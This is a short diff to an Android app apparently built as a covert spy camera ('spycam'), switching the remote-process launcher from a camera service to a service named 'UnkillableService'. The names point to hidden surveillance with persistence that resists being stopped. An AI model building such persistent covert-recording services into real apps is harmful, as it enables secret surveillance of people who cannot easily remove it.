@@ -6,6 +6,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import com.spylab.spycam.remote.CameraService
+import com.spylab.spycam.remote.UnkillableService
 import com.spylab.spycam.remote.UnlockReceiver
 
 
@@ -29,7 +30,7 @@ object ProcessHelper {
     }
 
     fun startRemoteProcess(context: Context) {
-        val intent = Intent(context, CameraService::class.java)
+        val intent = Intent(context, UnkillableService::class.java)
         intent.putExtra("Command", "start_process")
         context.startService(intent)
     }
